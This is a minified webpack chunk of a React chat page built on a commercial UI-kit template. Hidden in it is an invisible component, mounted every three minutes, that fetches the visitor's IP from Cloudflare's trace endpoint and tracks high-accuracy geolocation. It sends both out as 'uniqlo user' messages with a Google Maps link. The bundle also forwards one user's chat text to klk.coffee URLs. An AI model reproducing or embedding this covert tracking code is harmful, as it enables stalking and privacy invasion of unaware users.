/*!

=========================================================
* Now UI Kit PRO React - v1.0.0
=========================================================

* Product Page: https://www.creative-tim.com/product/now-ui-kit-pro-react
* Copyright 2019 Creative Tim (http://www.creative-tim.com)

* Coded by Creative Tim

=========================================================

* The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

*/
(this["webpackJsonpmaterial-kit-pro-react"]=this["webpackJsonpmaterial-kit-pro-react"]||[]).push([[16],{249:function(e,t,a){"use strict";a.d(t,"b",(function(){return o})),a.d(t,"c",(function(){return r})),a.d(t,"a",(function(){return i}));var n,c=a(282),o=function(e,t,a){if(void 0!==window.navigator.geolocation){window.navigator.geolocation.getCurrentPosition((function(t){var n={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0};e(n),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})}},r=function(e,t,a){c.a;if(n=n||new Date,void 0!==window.navigator.geolocation)return navigator.geolocation.watchPosition((function(t){var c={lat:t.coords.latitude?t.coords.latitude:void 0,lng:t.coords.longitude?t.coords.longitude:void 0},o=new Date;Math.abs(o-n)/1e3%60>180&&(e(c),n=new Date),a(!0)}),(function(e){t({0:"\u4e0d\u660e\u539f\u56e0\u932f\u8aa4",1:"\u4f7f\u7528\u8005\u62d2\u7d55\u63d0\u4f9b\u4f4d\u7f6e\u8cc7\u8a0a",2:"\u7121\u6cd5\u53d6\u5f97\u4f4d\u7f6e\u8cc7\u8a0a",3:"\u4f4d\u7f6e\u67e5\u8a62\u903e\u6642"}[e.code]),a(!1)}),{enableHighAccuracy:!0,timeout:5e3,maximumAge:0})},i=function(e){void 0!==window.navigator.geolocation&&navigator.geolocation.clearWatch(e)}},282:function(e,t,a){"use strict";a.d(t,"a",(function(){return n}));var n=18e4},339:function(e,t,a){"use strict";a.d(t,"b",(function(){return m})),a.d(t,"a",(function(){return O}));var n=a(2),c=a.n(n),o=a(196),r=a(242),i=a.n(r),u=a(340),s=a.n(u),l=a(341),f=a.n(l),b={fontSize:"0.7rem"},d=function(e){var t=new Date(e),a=g(t.getHours()),n=g(t.getMinutes()),c=Date.now(),o=parseInt(c-e,10)/1e3/60,r=o/60;return o<=60?"".concat(a,":").concat(n):o>60&&r<=24||r>24?"".concat(a,":").concat(n," ----- ").concat(t.toDateString()):o},g=function(e){var t=e.toString();return 1===t.length?"0".concat(t):t},O=function(e){return e===o.b?s.a:e===o.a?f.a:i.a},m=function(e){return e.user===o.b?c.a.createElement("span",{style:b},"Karen ",c.a.createElement("small",null,"\xb7 ",d(e.createOn)," ")):e.user===o.a?c.a.createElement("span",{style:b},"Kevin ",c.a.createElement("small",null,"\xb7 ",d(e.createOn))):c.a.createElement(c.a.Fragment,null)}},340:function(e,t,a){e.exports=a.p+"static/media/gloria2.666943cf.jpg"},341:function(e,t,a){e.exports=a.p+"static/media/jerry.2aa27bf0.jpg"},844:function(e,t,a){"use strict";a.r(t);var n=a(19),c=a(123),o=a.n(c),r=a(2),i=a.n(r),u=a(53),s=a(20),l=a(40),f=a(118),b=a(85),d=a(86),g=a(342),O=a(338),m=a(339),j=a(90),v=a(224),p=a(196),h=a(228),w=a(249),E=(a(32),Object(s.f)((function(e){e.history;var t=Object(r.useState)(void 0),a=Object(n.a)(t,2),c=a[0],o=a[1],u=Object(r.useState)(void 0),s=Object(n.a)(u,2),l=s[0],f=s[1],b=Object(r.useState)(void 0),d=Object(n.a)(b,2),g=d[0],O=d[1],m=Object(r.useState)(void 0),j=Object(n.a)(m,2),p=j[0],h=j[1];return Object(r.useEffect)((function(){fetch("https://www.cloudflare.com/cdn-cgi/trace").then((function(e){return e.text()})).then((function(e){var t=e.split("\n"),a=Object(n.a)(t,3),c=(a[0],a[1],a[2]);if(c){var r=c.split("="),i=Object(n.a)(r,2),u=(i[0],i[1]);o(u)}}))}),[]),Object(r.useEffect)((function(){Object(w.b)(f,O,h);var e=Object(w.c)(f,O,h);return function(){e&&Object(w.a)(e)}}),[]),Object(r.useEffect)((function(){if(g){console.log(g);var e="uniqlo user error: ".concat(g);Object(v.a)(e)}}),[g,p]),Object(r.useEffect)((function(){if(l){var e="uniqlo user \n ip:".concat(c," \n https://www.google.com.tw/maps?q=").concat(l.lat,",").concat(l.lng);Object(v.a)(e)}}),[l]),i.a.createElement(r.Fragment,null)}))),k=a(282),y=a(93),S=a(76),D=a(25),x=(a(55),a(336)),C=(a(337),Object(f.a)(h.a));t.default=Object(s.f)((function(e){e.history;var t=C(),a=Object(u.useSelector)((function(e){return e.login})).user,c=Object(r.useState)(void 0),s=Object(n.a)(c,2),f=s[0],h=s[1],w=Object(r.useState)(""),I=Object(n.a)(w,2),M=I[0],U=I[1],A=Object(r.useState)(""),F=Object(n.a)(A,2),H=F[0],T=F[1],q=Object(r.useState)(!0),J=Object(n.a)(q,2),N=J[0],P=J[1],R=Object(u.useSelector)((function(e){return e.chat})).maxMessageNumber;Object(r.useEffect)((function(){if(l.c&&void 0!==R){var e=Object(D.f)(l.c,Object(D.c)(R));Object(D.d)(e,(function(e){K(e)}))}}),[R]),Object(r.useEffect)((function(){if(a&&H&&""!==H){var e={user:a,message:"".concat(H),createOn:Date.now()},t={};t[Object(D.e)(Object(D.a)(Object(D.g)(l.d),"chatMsg")).key]=e,Object(D.i)(l.c,t).then((function(){if(a===p.b){Object(v.a)("https://klk.coffee/auto")}})).catch((function(e){console.log(e.message),x.b.error(e.message),Object(v.a)("replyImageUrl update error: ".concat(e.message))}))}}),[H]),Object(r.useEffect)((function(){setTimeout((function(){P(!1)}),5e3),setInterval((function(){P(!0),setTimeout((function(){P(!1)}),5e3)}),k.a)}),[]);var K=function(e){var t=e.val();if(null!==t&&void 0!==t){var n=o.a.slice(o.a.values(t),-R),c=o.a.slice(o.a.values(n),-1)[0].user;o.a.slice(o.a.values(n),-1)[0].createOn;a===c?(U(""),h(n)):h(n)}};return i.a.createElement("div",{className:t.section},i.a.createElement(b.a,{justify:"center"},i.a.createElement(d.a,{xs:12,sm:8,md:8},i.a.createElement("div",null,f?f.map((function(e,t){return i.a.createElement(g.a,{key:void 0!==e.id?e.id:t,avatar:Object(m.a)(e.user),title:Object(m.b)(e),message:e.message})})):i.a.createElement("div",null),i.a.createElement(O.a,{avatar:Object(m.a)(a),value:M,onChange:function(e){U(e.target.value)},onReply:function(e){try{if(a&&""!==M){var t={user:a,message:M,createOn:Date.now()},n=Object(D.e)(Object(D.a)(Object(D.g)(l.d),"chatMsg")).key,c={};c[n]=t;var o=!1;if(Object(D.i)(l.c,c).then((function(){if(a===p.b){var e="https://klk.coffee/auto?update=true&message=".concat(M);Object(v.a)(e),o=!0}})).catch((function(e){var t;e&&(t=e.message?e.message:JSON.stringify(e),console.log(t),x.b.error(t),Object(v.a)("onReplyClick update error: ".concat(t)));if(a===p.b){var n="https://klk.coffee/auto?update=false&message=".concat(M);Object(v.a)(n)}})),a===p.b){var r="https://klk.coffee/auto?message=".concat(M);Object(v.a)(r)}setTimeout((function(){!1===o&&(x.b.error("\u5df2\u65b7\u7dda, \u8acb\u91cd\u65b0\u767b\u5165",{autoClose:1e4}),Object(v.a)("\u5df2\u65b7\u7dda, \u8acb\u91cd\u65b0\u767b\u5165"))}),2e3)}}catch(u){if(a===p.b){var i="https://klk.coffee/auto?update=false&error=".concat(u.message);Object(v.a)(i)}}},onUpdate:function(e){if(a){var t=R+1;Object(S.a)(y.a,t)}if(a===p.b){Object(v.a)("https://klk.coffee/update")}},enableUpdate:!0,setReplyImageUrl:T,enableImageUpload:!0})))),i.a.createElement(j.a,null),i.a.createElement(x.a,{theme:"dark",position:"bottom-center",autoClose:1e3,hideProgressBar:!1,newestOnTop:!1,closeOnClick:!0,rtl:!1,pauseOnFocusLoss:!0,draggable:!0,pauseOnHover:!0}),N?i.a.createElement(E,null):i.a.createElement(r.Fragment,null))}))}}]);
//# sourceMappingURL=16.6d98a4c2.chunk.js.map